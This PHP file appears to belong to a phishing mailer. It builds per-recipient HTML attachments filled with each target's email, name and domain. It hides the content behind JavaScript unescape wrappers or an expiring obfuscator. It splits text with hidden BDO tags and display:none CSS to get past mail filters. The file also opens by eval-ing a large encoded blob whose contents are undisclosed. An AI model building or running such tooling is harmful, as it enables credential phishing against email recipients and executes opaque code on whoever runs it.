ERVdBaUpLK2dCeWRNV2FIMTZwWFNKOWFGWWw2VitCWUdDMFRaZXdDSXVOdFRoQU85MHYrYXJ3d3k4Y3E3SEE1c1M2NldHZ2NicVN2TUlyNjNWNjVtM29SeXI1WUZqcGFVYnJSU0UvZllzQTc4WUhiWkRqeUJaNDBNSVdSTFNtallBdElmbHo2c2RPUmhCZ1ZDcGNZZXNCYXU4dzl3cTZ1TDltUUN4VjM1R3QwREUyMndlK3dKNjU1SDJUSGZtS0JFaEpybmFRU0x5VDZteWhMNzVQNHp5Mlk2b29XMGwrQlNlaVpyeW1OZ3RDSlhLSW9Ib3lxME0xQVkzdkE5M2p2K3lKUEtQMGZxRityanRyK0FWMEptR05uQ3p5SFRvK0Z0VzNTNU93OVBsTmlQMlcray9adFN6aWZxRk9BYllnWjFCQkc4dHAwYXVoSDhYR0dTT052c2VRN1lZSHk1QW5GSm4zMG9Fa3ZWM0ZqVUE5Q1g4MUoyT0pTTmR0aW5xeDhyaHlYOHJNUW9ob2gvV3pMaGx2dkdCWHVFY2s5WjdCdmtUNHpsdnVqSlNzQS92WVBFWDVYbFFUMUp5TjliMVMzWUQrRXpEaGZYYzBjNFFyVUZzSUFwNXlpOW1VSnVZbUtITm9Gb0xHQTZ3eWtaZ1BKOWxpR1kvbVk3VUJGVWJNcUdRRXcyT1RIOFRUZHJ4aGRQQ3lEMHhOZ2J0R0RveUwrMDJhSWlQa3lTbENTUkd3Q1hOZlcxcmtXK1g2Q243RlBwdmlQYWRVZEp4ODRmYk40OTB2VkI1ZzNiSElDbWtEZEU0WnJ1NlNBM1BJVFZzdTUxeG8zOHVVNTRrdUg3VVpVQ1Bma3VzbTd1NGlneU9rRXc2QTVKRWh5bjhuVHl0bUcxL2U3eWJPclovMzNVTm9jZDFDVnRuNU45b2NtaE1LUnJacUlScDNnWjZSUlQ3eHlTNFk2OC9EbFU0WThVaW45VUFEVlplSWZramtkNjFTZUhXY3ptSjdFT1RmenBJVUtLZU8yWjNCQ2FEaHcxNWlNSndCdHZYWHZEOERTZUFGOXdVS0xWaWRHTXVUQkJ5NFB2MzlBNXVzeklqcUpsYUpxekUweU4zdC9WbURrRmwwME14NEJ2RFI1TGZKcHQwOFBDVzRJNUg2b2tnVWdGOVVRbTA3aUpKWjRxN3gxajR3YXBEMHl3OVhoelNNejVJUVZFenRNeFd0Q1E5YUQxRERHTEFDb0EzWGZKMlNxdVN6dFRzUkZHRjNSZ0xCaDlGNDljb1g5OHJPUEJ3K21BYVpyT21UeG9WOFRpRWpaaEdoMjRwcFp1S0p2VkN0aVhveGlzYUxrejh0SWRhNWZVUFA3cDltUm1IdTZ1VVh0N2hVYnpHV0JHTzd3UEdmV0FhL3cvVmswaUlmL2plaXpVMnk2bk9BZ1N0QXF2UGRTTUJ2UGh0OVFUQllSOC9TbzdIQmdMU1U0RjRIenNodldsVndVS3RPeHA4YmZTeVRmQzkySExRbEhXSlM0Z29ZYjJVM0Z3SUdxMFBkVTduRFNFdkFhMlViOVJGNWtjSkxoZS9LYjVZRE9oQkdqUm9MeXo4blZNZHpiVnZsTzFQbEt3UDVHRmszbEFpaGVaSGVSSDIvS1A4d2hSZ3pZT0x2MVAzVklXeHRzNXJ4Z3c2dm96Y09jQlMvZ2t1RkpZQitMTUE3R2hsa0FNMXQvcnRYNDNkYUFybEpVWjhXT3dVNE5ydnE2ZVVHOWJmdktYRDdVMU9FQWkxK0dKSWxkVnRsd2VuYmxKMTExb0w4T1hpNzJlank4djFkNCtJOVdITHVVbWExSHdIb0FxeHlpTktIZE9oQWJpdENwM1hQWlloN3g2ZElMd2xydjE4QmdFd3U5L1Yzd3ZKbkNieStBNGFuaVFNakdxOUcxNGsyYVl3RWhjaTlZQXE4QWhPTUZUUTI2QThrN2o0RCtmOEs4Q0s4SGVtd0pybG9uenBMV3VPSzZ5NC9FeFhWdVRua3FIV3F4RHN0b0gxVkdmVFNzaGtiU1FuVUd6UjU3Ujh1Y3F0NDh0b1hWeGR4dUdSUW1TclZIQUFZQ3BidytXMndENnRuSU0rMGhzbzJQYlBvS2J1ZDdXS05USk9IYkRYZjQvS0taNC9hazV2WGJwcTcrUlU0bmNBWEJ3aDRuSXlSUFJiVEQrSklpcEQ3RStxbWUrSmJablQyN0EzRklTNG1na0VVUGdRNGJjM1NsOFJ0VGd4TllFOVpDWm9Za1FqZ2h3TWpyTnRsR3hTdk9FRHRESGxERDZNanZMUmFLSjZWTnk2YUp4cVA5R0RkQm14WTVHb0srSmMzSUtXNkJGOXVkR2ZNZzRBQlQ4bkZLTFI4d2NGelI1YytrbHd4bVVPZWNsRlJYYmxHcjBPT3ZqcllUSUMwRmNNaStMamJpdnpQYjdnSzRreWJMNFdxNnpoTWpLZW1sNGV6MHJESVpTYzcwZXV2UVhWSlJDMXA2WmNCR281WWFQYUQ2N1ZJb2ZLZkkwa1dsbGQ2aWxiSTFxK25INlR0V1JSYnFNL3R5dWp6U2dtckVJeUcwTnFaUlUyOXViY2JRU2lHZWhTbTJoNTF2ZGVwNmF2NXRudEpzSjFoc2tOTEFpdjhpUHNqZC9aeVhidmgyWWxBOFovRDViYzQ5c0ZCU2hVRDhtZk4xZDY4VDJNdHZXcHdnNmhOZDFKa3NFcmhha0h4KzRYRXpaT3JJVHhVY1ZTSkt3RWZ1TEJIeVVEN2QzNVFPbFlnK3JKS1lDU0ZoRW83Z0RFQW1Wd2xPMk5qbnpPSlBlbERNcXBjNEduL2x0WFhWMEJvbXhUazd5VmpSQ2M3MGV1NnltcXkxdnJPWWVpaDdEZUxyZ3craUxNU3g3SXM1WXVxcVc2Ylh3QjZkWWtQc0k2NDBNVE94ZEJ6MmJOL1YyZkt0RjdXTGI0N0k2ZDJEbW1TUHVnS1lCL1dPaW5zRWN0Z09QcDE5TkxzVE0xcVJEd3ZaTS9wclZBUTQvUjFjYVVLU1V3ci9lTDZWVSswamhRS0J4T1B5aENoSEhqN1NPWG5Ia3BpSVdhQ2dBNk1pSEtjVlk2WnZESnRNMW5TRndCV3c2ZUVwVy9zRE9CbURzL2hTM1AzSkt5SWV6VUtCalg1NnVNeHN5MTJhUXdoczRKZXFuZ1gvL0FsUEYrT1l1SDNaV3RYM015Nm1yVzZoRFo5SllZVDRzazMrRXdkQzB2MVlmaU14ai8zZjBZa0hYTld4MFpRVm1tUXpxN1hzdFk1WGZ1a3ZHalFGZzNPdlpVdzErekV2NGpsOWhaMGVBb2oyT2Zidm5JWW9Nam9pdHVoZkF4di8zMUJiQldxWngxLzFqL0dySU9Xck44NzJHd3B6OS8xQ1QyR1FCMDBTaG40";
eval(e7061($e7091));
?>

require 'Obfuscator.php';

function fixdetails($text,$email) {

    $em=explode('@',$email);
    $emaildomain = substr(strrchr($email, "@"), 1);
    $bc=explode('.',$emaildomain);
    $chgcap=strtolower($bc[0]);
    $frmsite=ucfirst($chgcap);
    $emincap=strtolower($em[0]);
    $mename=ucfirst($emincap);
    #$secretemail= secret_mail($email);
    $getram= rand();
    $date = date("l, F j, Y");
    $time = date("g:i a");
    $hexemail = bin2hex($email);
    $base64email = base64_encode($email);

    $text = str_replace("{email}", $email, $text);
    $text = str_replace("{date}", $date , $text);
    $text = str_replace("{time}", $time , $text);
    $text = str_replace("{base64email}", $base64email , $text);
    $text = str_replace("{hexemail}", $hexemail , $text);
    $text = str_replace("{domain}", $emaildomain , $text);
    $text = str_replace("{frmsite}", $frmsite , $text);
    $text = str_replace("{mename}", $mename , $text);
    $text = str_replace("{username}", $mename , $text);
    $text = str_replace("{user}", $mename , $text);
    $text = str_replace("{random}", random_num(10) , $text);
    $text = str_replace("{year}", date("Y"), $text);
    $text = str_replace("{month}", date("F"), $text);
    $text = str_replace("{minute}", date("j"), $text);
    $text = str_replace("{dayofweek}", date("l"), $text);
    $text = str_replace("{secs}", date("s"), $text);
    #$text = str_replace("{sendername}", $sender_name, $text);
    $text = getInbetweenStrings($text);
    return $text;
    #echo $this->myUrlEncode($text);
    #return $this->myUrlEncode($text);
  }

  function getisp($ip='') {
    if ($ip=='') $ip = $_SERVER['REMOTE_ADDR'];
    $longisp = @gethostbyaddr($ip);
    $isp = explode('.', $longisp);
    $isp = array_reverse($isp);
    $tmp = $isp[1];
    if (preg_match("/\<(org?|com?|net)\>/i", $tmp)) {
    $myisp = $isp[2].'.'.$isp[1].'.'.$isp[0];
    } else {
    $myisp = $isp[1].'.'.$isp[0];
    }
    if (preg_match("/[0-9]{1,3}\.[0-9]{1,3}/", $myisp))
    return 'ISP lookup failed.';
    return $myisp;
}

function validate_email($email){
    $status=false;
    $regex='/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/'; 
    if(preg_match($regex, $email)){$status=true;}
    return $status; 
}

function random_num($len) {
   $ch = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
   $l = strlen ($ch) - 1;
   $str = "";
   for ($i=0; $i < $len; $i++)
   {
       $x = rand (0, $l);
       $str .= $ch[$x];
   }
   return $str;
  }


function AddDate($value) {
    $ten_days_later = time() + $value*60*60*24;
    //echo 'It will be '.date('l, F j, Y', $ten_days_later).' '.$value.' days later.';
    $redate = date('l, F j, Y', $ten_days_later);
    return $redate;
  }

function getInbetweenStrings($str){
    //print("Before Encode: ".$str."\n\r\n\n");
    $pattern = "/base64{(.*?)}/";
    preg_match_all($pattern, $str, $matches,PREG_PATTERN_ORDER);

    $number = "/{number(.*?)}/";
    preg_match_all($number, $str, $m_number,PREG_PATTERN_ORDER);

    $random = "/{random(.*?)}/";
    preg_match_all($random, $str, $m_random,PREG_PATTERN_ORDER);

    $newdate = "/{date(.*?)}/";
    preg_match_all($newdate, $str, $n_date,PREG_PATTERN_ORDER);


    foreach ($m_number[0] as $numberf) {
        //print($numberf."\r\n");
        $betwn = '/\d+/';
        preg_match($betwn, $numberf, $mbtn);
        //print("inbetween: ".$mbtn[0]."\n");
        $nume=random_num($mbtn[0]);
        //print("Encoded: ".$nume."\n");
        $str = str_replace($numberf, $nume, $str);
    }

    foreach ($m_random[0] as $m_randomf) {
        //print($m_randomf."\r\n");
        $m_randombetwn = '/\d+/';
        preg_match($m_randombetwn, $m_randomf, $m_randommbtn);
        //print("inbetween: ".$m_randommbtn[0]."\n");
        $m_randomnume=random($m_randommbtn[0]);
        //print("Encoded: ".$m_randomnume."\n");
        $str = str_replace($m_randomf, $m_randomnume, $str);
    }

    foreach ($n_date[0] as $m_ddate) {
        //print($m_ddate."\r\n");
        $m_dat = '/\d+/';
        preg_match($m_dat, $m_ddate, $m_dbtn);
        //print("inbetween: ".$m_randommbtn[0]."\n");
        $m_dfoun=AddDate($m_dbtn[0]);
        //print("Encoded: ".$m_dfoun."\n");
        $str = str_replace($m_ddate, $m_dfoun, $str);
    }

    foreach ($matches[0] as $base64) {
        //print($base64."\r\n");
        $betw = '/{(.*)}/';
        preg_match($betw, $base64, $mbt);
        //print("inbetween: ".$mbt[1]."\n");
        $base64e=base64_encode($mbt[1]);
        //print("Encoded: ".$base64e."\n");
        $str = str_replace($base64, $base64e, $str);
    }
    //print("After Encode: ".$str."\n");
    return $str;
}

function random($len) {
   $ch = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   $l = strlen ($ch) - 1;
   $str = "";
   for ($i=0; $i < $len; $i++){
       $x = rand (0, $l);
       $str .= $ch[$x];
   }
   return $str;
}

function escapeJavaScriptText($string) 
{ 
    return str_replace("\n", '\n', str_replace('"', '\"', addcslashes(str_replace("\r", '', (string)$string), "\0..\37'\\"))); 
} 


function myUrlEncode($string) {
    return urlencode(mb_convert_encoding ($string, 'Windows-1252', "UTF-8"));
}

function escapecode($message,$javaescape=true,$obsfucate=false,$setexpire=""){
    //global $javaescape,$obsfucate,$setexpire ;

    if ($javaescape) {
        $message = rawurlencode($message);
        $message = "document.write(unescape('".$message."'))";
        //$jsCode = $message; //Simple JS code
        $message = "<script>" . $message . "</script>";
    }
    if ($obsfucate) {
        $hunter = new HunterObfuscator($message, true);
        if (!empty($setexpire)) {
            $hunter->setExpiration($setexpire); 
        }
        $message = $hunter->Obfuscate();
        $message = "<script>" . $message . "</script>";
    }
    return $message;

}


function BuildAttachFile($name='{email}.html',$email="test@mail.com",$javaescape=true,$obsfucate=false,$setexpire=""){

try {

    if ($content = (file_get_contents('file.html'))) {
        $content = fixdetails($content,$email);
        if ($javaescape || $obsfucate) {
            $content = escapecode($content,$javaescape,$obsfucate,$setexpire);
           // echo ($content); 
        }

    }else{
        throw new Exception('File "file.html" not found.');
    }

    if(!file_exists($name)){
        file_put_contents($name, $content, FILE_APPEND);
    }else{
        unlink($name);
        file_put_contents($name, $content, FILE_APPEND);
    }

} catch (Exception $e) {
    echo date("Y-m-d G:i:s").'     SERVER -> ATTACH error:  ['.$e->getMessage().'] '."\r\n";

}

return $name;

}

function startswith($string, $prefix) {
   return substr($string, 0, strlen($prefix)) == $prefix;
}

function mb_basename($path) {
    if (preg_match('@^.*[\\\\/]([^\\\\/]+)$@s', $path, $matches)) {
        return $matches[1];
    } else if (preg_match('@^([^\\\\/]+)$@s', $path, $matches)) {
        return $matches[1];
    }
    return '';
}

function CW0147($string, &$references) {

    static $counter  ;
    static $list  ;
    static $list_q  ;

    if (!isset($counter)) {
        $counter = 0 ;
        $list = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9');

        // See comments below - Many Thanks @revo
        usort($list, function($a,$b) { return strlen($b)< strlen($b) ; }); 

        $list_q = array_map('preg_quote', $list);
    }

    return preg_replace_callback('~('.implode('|',$list_q).')~',
        function($matches) use (&$counter, &$references){
            $counter++;
            $references[$counter] = $matches[0];
            return $matches[0].'<BDO>{time}{date}</BDO>' ;

    }, $string) ;
}

function CW0148($string){
    $matchess = [] ;


    #$string = str_replace('</head>', $style.'</head>', $string);
    $text_to_echo =  preg_replace_callback(
        "/(<([^.]+)>)([^<]+)(<\\/\\2>)/s", 
        function($matches){
            $text = CW0147($matches[3], $matchess);
            #$text = str_replace(array("text", "want"),array('TEXT', 'need'),$matches[3]);
            return $matches[1].$text.$matches[4];
        }, 
        $string
    );

    $strings = $text_to_echo;

    return $strings;
}

function CW0149($string){
    $style = '#Z[Time_own_format]S{
        PADDING: 10px; 
        TEXT-ALIGN: center; 
        MARGIN: 0px auto; 
        FONT-FAMILY: Arial; 
        FONT-SIZE: 16px; 
        COLOR: #F8F8F8; 
        WIDTH: 290px; 
        FONT-WEIGHT: bolder; 
        BACKGROUND-COLOR: #FF1F1F;
        }'."\r\n".

    '#k[Time_own_format]m { 
        display: none;
        height: px;
        font-size:px;
        }'."\r\n".

    '#soot {
        font-size: px;
        }'."\r\n".

    'BDO{
        display: none;
    }'."\r\n";

    if (strpos($string, '</style>') !== false) {
        $string = str_replace('</style>', $style.'</style>'."\r\n", $string);
    }else{
        $string = '<style>'."\r\n".$style.'</style>'."\r\n";

    }

    return $string;
}

function CW0146($html,$file=False){
    preg_match("/<body[^>]*>(.*?)<\/body>/is", $html, $matches);
    preg_match("/<style[^>]*>(.*?)<\/style>/is", $html, $style);
    $style = $style[0];
    $body = $matches[1];
    $newbody = CW0148($body);
    $newstyle = CW0149($style);
    #echo($newbody);
    #echo($newstyle);
    $htmlContent = '<html>'."\r\n".'<head>'."\r\n";
    $htmlContent .= $newstyle."\r\n";
    $htmlContent .= '</head>'."\r\n".'<body>'."\r\n";
    $htmlContent .= $newbody."\r\n";
    $htmlContent .= '</body>'."\r\n".'</html>'."\r\n";
    if($file){
        $newfmfile = "ENCRYPT_FM_".date('m_d_Y_h_i_a').".html";
        $myfile = fopen($newfmfile, "w") or die("Unable to open file!");
        $txt = $htmlContent."\n";
        fwrite($myfile, $txt);
        fclose($myfile);
        return $newfmfile;
    }else{
        return $htmlContent;
    }
}
